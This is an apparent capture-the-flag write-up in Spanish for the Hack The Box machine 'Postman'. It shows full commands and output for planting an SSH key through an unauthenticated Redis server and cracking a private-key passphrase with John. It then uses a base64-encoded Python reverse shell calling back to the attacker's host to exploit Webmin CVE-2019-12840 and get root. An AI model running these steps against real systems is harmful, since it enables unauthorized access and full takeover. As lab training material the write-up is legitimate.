# POSTMAN
#Tables of contents
1. [Escaneo](#escaneo)
2. [nmap](#nmap)
3. [root user](#vamos-para-root)
## Escaneo
###nmap

Primero vamos a realizar un escaneo de los puertos abiertos de la máquina.

```bash 
$ nmap -p- --open -T5  10.10.10.160 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-22 22:43 BST
Nmap scan report for 10.10.10.160
Host is up (0.049s latency).
Not shown: 45183 closed ports, 20348 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
6379/tcp  open  redis
10000/tcp open  snet-sensor-mgmt

Nmap done: 1 IP address (1 host up) scanned in 20.52 seconds
```

Unos vez obtenemos los puertos abiertos, vamos a realizar un escaneo mas en profundidad de estos puertos (22,80,6379,10000).

``` bash
$ nmap -p22,80,6379,10000 --open -T5 -sV -sC  10.10.10.160
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-22 22:44 BST
Nmap scan report for 10.10.10.160
Host is up (0.050s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.15 seconds
```

Teniendo acceso a Redis, vamos a subir una private key ssh que utilizaremos para conectarnos.
Para subir la key primero la declararemos como una variable de redis. Para posteriormente guardar la configuracion de redis en un fichero, que lo nombraremos "authoritzedkeys".

Primero de todo vamos a generar una par de claves SSH

``` bash
$ ssh-keygen -t rsa -C "segsalvaje@postman"
Generating public/private rsa key pair.
Enter file in which to save the key (/home/segsalvaje/.ssh/id_rsa):
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /home/segsalvaje/.ssh/id_rsa.
Your public key has been saved in /home/segsalvaje/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:XQ66Rj2OBsklaYz3Er5ehKZnzQ+VFFF+cI4DKzYQyj8 segsalvaje@postman
The key's randomart image is:
+---[RSA 3072]----+
|      o.  +oo .  |
|   . + o   = =   |
|    + B = + = o  |
|     * O B = o   |
|      E S * .    |
|     o X = .     |
|    . + X .      |
|     + + o       |
|      .   .      |
+----[SHA256]-----+
```

Con las claves generadas vamos a poner la clave privada en un fichero con espacios por enzima y por debajo, para a la hora de guardar el fichero con redis no este cerca de caracteres raros.

```
$ (echo -e "\n\n"; cat /home/segsalvaje/.ssh/id_rsa.pub; echo -e "\n\n") > public.txt
```

```
$ catn public.txt 



ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDP8pUQudmwIVkLns8jz6j5vjhGZa32bhJCVC3b240uVD8uHv1hK2Ffg5EdMNp1+YmMI14dd3V3UofMeCMOmarAOv0kJJC8ZIb455s2szK6FsrcCXVE9lZOMgzyMDRSlpG0qklaQJkI0vgvzbklt2Jj7XGy8HV/N+R81XwLER7sTsTt5hs55VbFXWVu4d6Yrzj1Q9zRbz2MNYdJs6uFQsPGfYIJ8g6ppvp6dK7drelezlIVG9TBib0NXqEPSlIx7RrD92bVkeGWk/NwEKtOr0PrJzxVsp9yxn1Xb2zJ532WdgSrpBz/YL5XTcv/EvAvJZf6eaaBmrPCiTg5ZNCfoVj3/5mQWA5qJEbs/7pRw8ElYtWKhwft4wcGzPW7LZVk8ooNe86uUMLcXo2yZpp7Je5iln1cpOGcAyOj3e//8PmwL2RfJLRfaVCOlGJkJyyNHX5Hx4HarYSnJ6JUTWD2cCvLtFxnckcWqa8NXaGY6SLFQHYNVFoOl2rhi2rYb/yCG68= segsalvaje@postman

```
Ahora vamos a subir la clave ssh a Redis, y la guardamos en la variable keyssh

```
$ cat public.txt | redis-cli -h 10.10.10.160 -x set keyssh
OK
```

Comprobamos que se ha subido correctamente la clave. Y procedemos a guardar la configuración en el path /var7lib/redis/.ssh/ con el nombre de authorized_keys.

```
$ redis-cli -h 10.10.10.160
10.10.10.160:6379> get keyssh
"\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDP8pUQudmwIVkLns8jz6j5vjhGZa32bhJCVC3b240uVD8uHv1hK2Ffg5EdMNp1+YmMI14dd3V3UofMeCMOmarAOv0kJJC8ZIb455s2szK6FsrcCXVE9lZOMgzyMDRSlpG0qklaQJkI0vgvzbklt2Jj7XGy8HV/N+R81XwLER7sTsTt5hs55VbFXWVu4d6Yrzj1Q9zRbz2MNYdJs6uFQsPGfYIJ8g6ppvp6dK7drelezlIVG9TBib0NXqEPSlIx7RrD92bVkeGWk/NwEKtOr0PrJzxVsp9yxn1Xb2zJ532WdgSrpBz/YL5XTcv/EvAvJZf6eaaBmrPCiTg5ZNCfoVj3/5mQWA5qJEbs/7pRw8ElYtWKhwft4wcGzPW7LZVk8ooNe86uUMLcXo2yZpp7Je5iln1cpOGcAyOj3e//8PmwL2RfJLRfaVCOlGJkJyyNHX5Hx4HarYSnJ6JUTWD2cCvLtFxnckcWqa8NXaGY6SLFQHYNVFoOl2rhi2rYb/yCG68= segsalvaje@postman\n\n\n\n"
10.10.10.160:6379> config set dir "/var/lib/redis/.ssh"
OK
10.10.10.160:6379> config set dbfilename "authorized_keys"
OK
10.10.10.160:6379> save
OK
10.10.10.160:6379> 
```

Ahora ya nos podemos conetar utilizando las claves ssh.

```
$ ssh -i id_rsa redis@10.10.10.160
Warning: Identity file id_rsa not accessible: No such file or directory.
The authenticity of host '10.10.10.160 (10.10.10.160)' can't be established.
ECDSA key fingerprint is SHA256:kea9iwskZTAT66U8yNRQiTa6t35LX8p0jOpTfvgeCh0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.160' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
redis@Postman:~$ 
```
Si comprobamos el fichero authorized_keys, vemos lo que hemos comentado anteriormente.

```
redis@Postman:~$ cat .ssh/authorized_keys 
REDIS0008       redis-ver4.0.9
redis-bits@ctime8$used-mem

                          aof-preamblekeysshBB


ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDP8pUQudmwIVkLns8jz6j5vjhGZa32bhJCVC3b240uVD8uHv1hK2Ffg5EdMNp1+YmMI14dd3V3UofMeCMOmarAOv0kJJC8ZIb455s2szK6FsrcCXVE9lZOMgzyMDRSlpG0qklaQJkI0vgvzbklt2Jj7XGy8HV/N+R81XwLER7sTsTt5hs55VbFXWVu4d6Yrzj1Q9zRbz2MNYdJs6uFQsPGfYIJ8g6ppvp6dK7drelezlIVG9TBib0NXqEPSlIx7RrD92bVkeGWk/NwEKtOr0PrJzxVsp9yxn1Xb2zJ532WdgSrpBz/YL5XTcv/EvAvJZf6eaaBmrPCiTg5ZNCfoVj3/5mQWA5qJEbs/7pRw8ElYtWKhwft4wcGzPW7LZVk8ooNe86uUMLcXo2yZpp7Je5iln1cpOGcAyOj3e//8PmwL2RfJLRfaVCOlGJkJyyNHX5Hx4HarYSnJ6JUTWD2cCvLtFxnckcWqa8NXaGY6SLFQHYNVFoOl2rhi2rYb/yCG68= segsalvaje@postman



k8nQ
redis@Postman:~$ 
```

Vemos que la flag de user la tiene el user Matt, y des del user redis no podemos leer la flag de user.

```
redis@Postman:~$ find /home/ -name "user.txt" -ls 2>/dev/null
   159000      4 -rw-rw----   1 Matt     Matt           33 Aug 26  2019 /home/Matt/user.txt
```
#### Escalada de privilegios

Vamos a proceder a la escalada de privilegios del user Matt para poder obtener la flag de user.
Primero buscaremos todos los ficheros del usuario:

```
redis@Postman:~$ find / -user Matt -type f 2>/dev/null -ls | grep Matt
   158996      4 -rwxr-xr-x   1 Matt     Matt         1743 Aug 26  2019 /opt/id_rsa.bak
   143265      4 -rw-r--r--   1 Matt     Matt         3771 Aug 25  2019 /home/Matt/.bashrc
   131199      4 -rw-------   1 Matt     Matt         1676 Sep 11  2019 /home/Matt/.bash_history
   159000      4 -rw-rw----   1 Matt     Matt           33 Aug 26  2019 /home/Matt/user.txt
   158997      4 -rw-rw-r--   1 Matt     Matt           66 Aug 26  2019 /home/Matt/.selected_editor
   143266      4 -rw-r--r--   1 Matt     Matt          807 Aug 25  2019 /home/Matt/.profile
   157974      4 -rw-rw-r--   1 Matt     Matt          181 Aug 25  2019 /home/Matt/.wget-hsts
   143267      4 -rw-r--r--   1 Matt     Matt          220 Aug 25  2019 /home/Matt/.bash_logout
   157972      4 -rw-rw-r--   1 Matt     Matt          482 Aug 25  2019 /var/www/SimpleHTTPPutServer.py
```
Encontramos un fichero con una clave privada que tiene un passphrase.
Vamos a descargarnos el fichero id_rsa, para probar de crackearlo:

```
scp -i /home/segsalvaje/.ssh/id_rsa redis@10.10.10.160:/opt/id_rsa.bak .
id_rsa.bak                                100% 1743    33.3KB/s   00:00
```

Pasamos de la clave ssh a un hash para poderlo crackear con John:

```
python /usr/share/john/ssh2john.py id_rsa.bak > id_rsa.hash
```

Con el hash generado lo vamos a crackear con John:

```
$ /usr/sbin/john --format=ssh -w=/usr/share/wordlists/rockyou.txt id_rsa.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 8 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (id_rsa.bak)
Warning: Only 4 candidates left, minimum 8 needed for performance.
1g 0:00:00:11 DONE (2020-06-22 22:54) 0.08849g/s 1269Kp/s 1269Kc/s 1269KC/sa6_123..n1nj4W4rri0R!
Session completed
```
Obtenemos que el passphrase es **computer2008**.
Probamos de usar la key y el passphrase encontrado pero no nos podemos conectar.
Finalmente encontramos que el passphrase es el password del user. Des del usuarios redis saltamos al usuario Matt.

```
redis@Postman:~$ su Matt
Password: 
Matt@Postman:/var/lib/redis$ 
```

Ahora ya si que podemos acceder a la flag del usuario.

```
Matt@Postman:/var/lib/redis$ cat /home/Matt/user.txt | head -c 20
517ad0ec2458ca97af8d
```


## Vamos para ROOT

Ahora vamos a analizar el puerto 10000, que tiene un webmin. La web tiene un panel de login, que podemos entar con las credenciales de Matt.

https://10.10.10.160:10000/

Vemos que el webmin es la version 1.910, que es vulnerable a **CVE2019-12840**.

Hacemos la captura con el burp.

Vamos a generar una shell inversa con python. Este payload lo tenemos que convertir a base64 para poder realizar la petición POST con brup.

```
$ catn payload.txt
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.30",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

$ cat payload.txt | base64 | tr -d "\r\n" && echo
cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTAuMTQuMzAiLDkwMDEpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOycK
```
Como la shell inversa la he configurado en el puerto 9001, vamos a levantar en modo escucha ese puerto. 
Al ejecutar el payload se nos abre la shell inversa con el usuario root.

```
$ sudo nc -lvnp 9001
[sudo] password for segsalvaje: 
listening on [any] 9001 ...
connect to [10.10.14.30] from (UNKNOWN) [10.10.10.160] 33872
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=0(root) gid=0(root) groups=0(root)
```

Ahora ya podemos visualizar la shell de root:

```
$ cat /root/root.txt | head -c 20
a257741c5bed8be7778c
```






